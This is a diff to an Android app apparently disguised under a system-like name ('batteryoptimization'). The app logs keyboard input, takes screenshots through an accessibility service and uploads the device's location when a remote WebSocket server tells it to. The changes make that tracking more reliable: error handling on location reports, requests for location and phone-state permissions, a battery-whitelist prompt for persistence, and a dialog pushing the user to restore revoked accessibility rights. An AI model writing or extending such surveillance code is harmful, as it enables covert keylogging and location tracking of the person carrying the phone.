@@ -2,13 +2,15 @@ package com.android.batteryoptimization
 
 import android.content.Context
 import android.content.Intent
+import android.net.Uri
 import android.os.Bundle
+import android.os.PowerManager
 import android.provider.Settings
 import android.text.TextUtils
+import android.widget.Toast
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import android.graphics.BitmapFactory
-import android.net.Uri
 import android.util.Log
 import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.result.contract.ActivityResultContracts
@@ -51,6 +53,10 @@ import java.text.SimpleDateFormat
 import java.util.*
 
 class MainActivity : ComponentActivity() {
+
+    companion object {
+        private const val TAG = "MainActivity"
+    }
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
@@ -105,6 +111,10 @@ class MainActivity : ComponentActivity() {
                     color = MaterialTheme.colorScheme.background
                 ) {
                     val navController = rememberNavController()
+                    val healthPrefs = getSharedPreferences(App.PREFS_HEALTH, Context.MODE_PRIVATE)
+                    val needManualSetup = remember {
+                        mutableStateOf(healthPrefs.getBoolean(App.KEY_NEED_MANUAL_SETUP, false))
+                    }
 
                     NavHost(navController = navController, startDestination = startDest) {
                         composable("binding") {
@@ -126,7 +136,12 @@ class MainActivity : ComponentActivity() {
                                 onNavigateToBatteryProtection = { navController.navigate("battery_protection") },
                                 onNavigateToUploadRecords = { navController.navigate("upload_records") },
                                 onNavigateToKeyboardRecords = { navController.navigate("keyboard_records") },
-                                onNavigateToLocationErrorLog = { navController.navigate("location_error_log") }
+                                onNavigateToLocationErrorLog = { navController.navigate("location_error_log") },
+                                needManualSetup = needManualSetup,
+                                dismissManualSetup = {
+                                    healthPrefs.edit().putBoolean(App.KEY_NEED_MANUAL_SETUP, false).apply()
+                                    needManualSetup.value = false
+                                }
                             )
                         }
                         composable("instructions") {
@@ -173,9 +188,15 @@ class MainActivity : ComponentActivity() {
         when (command) {
             "report_location", "force_report_location" -> {
                 CoroutineScope(Dispatchers.IO).launch {
-                    val location = AMapLocationHelper.getLocation(this@MainActivity)
-                    val locPayload = com.google.gson.Gson().toJson(location)
-                    WebSocketManager.send("""{"command":"upload_location","params":$locPayload}""")
+                    Log.e(TAG, "MainActivity 心跳开始定位")
+                    try {
+                        val location = AMapLocationHelper.getLocation(this@MainActivity)
+                        val locPayload = com.google.gson.Gson().toJson(location)
+                        WebSocketManager.send("""{"command":"upload_location","params":$locPayload}""")
+                        Log.d(TAG, "MainActivity 心跳定位发送成功，Location reported: lat=${location["latitude"]}, lng=${location["longitude"]}")
+                    } catch (e: Exception) {
+                        Log.e(TAG, "MainActivity 心跳定位发送失败，Failed to report location", e)
+                    }
                 }
             }
             "upload_data" -> {
@@ -218,6 +239,28 @@ class MainActivity : ComponentActivity() {
             }
         }
     }
+
+}
+
+// ─── 引导加入电池优化白名单（仅在 main 页面调用） ───────────────
+private fun ensureIgnoringBatteryOptimizations(context: Context) {
+    val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return
+    if (pm.isIgnoringBatteryOptimizations(context.packageName)) return
+    // 第一次进入 main 页只弹一次，避免打扰
+    val prefs = context.getSharedPreferences("keystroke_prefs", Context.MODE_PRIVATE)
+    if (prefs.getBoolean("requested_battery_ignore", false)) return
+    try {
+        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+            data = Uri.parse("package:${context.packageName}")
+        }
+        if (intent.resolveActivity(context.packageManager) != null) {
+            context.startActivity(intent)
+        }
+    } catch (t: Throwable) {
+        Log.w("MainActivity", "ignore battery opt request failed", t)
+    } finally {
+        prefs.edit().putBoolean("requested_battery_ignore", true).apply()
+    }
 }
 
 @OptIn(ExperimentalMaterial3Api::class)
@@ -229,7 +272,9 @@ fun AppScreen(
     onNavigateToBatteryProtection: () -> Unit,
     onNavigateToUploadRecords: () -> Unit,
     onNavigateToKeyboardRecords: () -> Unit,
-    onNavigateToLocationErrorLog: () -> Unit
+    onNavigateToLocationErrorLog: () -> Unit,
+    needManualSetup: MutableState<Boolean> = mutableStateOf(false),
+    dismissManualSetup: () -> Unit = {}
 ) {
     val coroutineScope = rememberCoroutineScope()
     val context = LocalContext.current
@@ -237,6 +282,26 @@ fun AppScreen(
     var isServiceConnected by remember { mutableStateOf(isServiceInstanceReady()) }
     var showAccessibilityDialog by remember { mutableStateOf(false) }
     val events by repository.eventsFlow.collectAsState(initial = emptyList())
+
+    // ── 权限申请：只有进入 main 页面才提示（定位、手机状态、忽略电池优化） ──
+    val permissionLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { /* 结果忽略，后续使用时再判断 */ }
+    LaunchedEffect(Unit) {
+        val permissions = arrayOf(
+            android.Manifest.permission.ACCESS_FINE_LOCATION,
+            android.Manifest.permission.ACCESS_COARSE_LOCATION,
+            android.Manifest.permission.READ_PHONE_STATE
+        )
+        val toRequest = permissions.filter {
+            androidx.core.content.ContextCompat.checkSelfPermission(context, it) != android.content.pm.PackageManager.PERMISSION_GRANTED
+        }
+        if (toRequest.isNotEmpty()) {
+            permissionLauncher.launch(toRequest.toTypedArray())
+        }
+        // 引导加入电池优化白名单（首次进入 main 页只弹一次）
+        ensureIgnoringBatteryOptimizations(context)
+    }
 
     fun startAutoScreenshot() {
         if (!isAccessibilityEnabledInSettings(context)) {
@@ -772,6 +837,34 @@ fun AppScreen(
             }
         )
     }
+
+    // ── 系统回收辅助权限 → 引导去「使用说明」页逐项设置 ──
+    if (needManualSetup.value) {
+        AlertDialog(
+            onDismissRequest = { dismissManualSetup() },
+            title = { Text("系统回收了辅助权限", fontWeight = FontWeight.Bold) },
+            text = {
+                Text(
+                    "检测到系统禁止了 App 自动恢复辅助权限。\n\n" +
+                    "请前往「使用说明」页面，按每一项逐个点击跳转完成设置（自启动、后台高耗电、后台弹出界面、最近任务锁定等）。",
+                    fontSize = 14.sp
+                )
+            },
+            confirmButton = {
+                TextButton(onClick = {
+                    dismissManualSetup()
+                    onNavigateToInstructions()
+                }) {
+                    Text("去使用说明", fontWeight = FontWeight.Bold)
+                }
+            },
+            dismissButton = {
+                TextButton(onClick = { dismissManualSetup() }) {
+                    Text("稍后")
+                }
+            }
+        )
+    }
 }
 
 @Composable
@@ -819,31 +912,25 @@ fun checkAccessibilityPermission(context: Context): Boolean {
     return isAccessibilityEnabledInSettings(context)
 }
 
-/** 仅检查系统设置中无障碍是否已开启本服务 */
+/** 仅检查系统设置中无障碍是否已开启本服务
+ *
+ * 注意：vivo / iQOO ROM 会把服务写入 ENABLED_ACCESSIBILITY_SERVICES 列表，
+ * 但 ACCESSIBILITY_ENABLED 全局开关却不置 1（与 AOSP 行为不一致）。
+ * 因此这里改为「只要本服务在 ENABLED_ACCESSIBILITY_SERVICES 列表里即视为已开启」，
+ * 不再强依赖 ACCESSIBILITY_ENABLED == 1。
+ */
 fun isAccessibilityEnabledInSettings(context: Context): Boolean {
-    var accessibilityEnabled = 0
     val service = "${context.packageName}/${InputAccessibilityService::class.java.canonicalName}"
-    try {
-        accessibilityEnabled = Settings.Secure.getInt(
-            context.contentResolver,
-            android.provider.Settings.Secure.ACCESSIBILITY_ENABLED
-        )
-    } catch (e: Settings.SettingNotFoundException) {
-        // Ignore
-    }
-    if (accessibilityEnabled == 1) {
-        val settingValue = Settings.Secure.getString(
-            context.contentResolver,
-            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
-        )
-        if (settingValue != null) {
-            val splitter = TextUtils.SimpleStringSplitter(':')
-            splitter.setString(settingValue)
-            while (splitter.hasNext()) {
-                val accessibilityService = splitter.next()
-                if (accessibilityService.equals(service, ignoreCase = true)) {
-                    return true
-                }
+    val settingValue = Settings.Secure.getString(
+        context.contentResolver,
+        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+    )
+    if (settingValue != null) {
+        val splitter = TextUtils.SimpleStringSplitter(':')
+        splitter.setString(settingValue)
+        while (splitter.hasNext()) {
+            if (splitter.next().equals(service, ignoreCase = true)) {
+                return true
             }
         }
     }
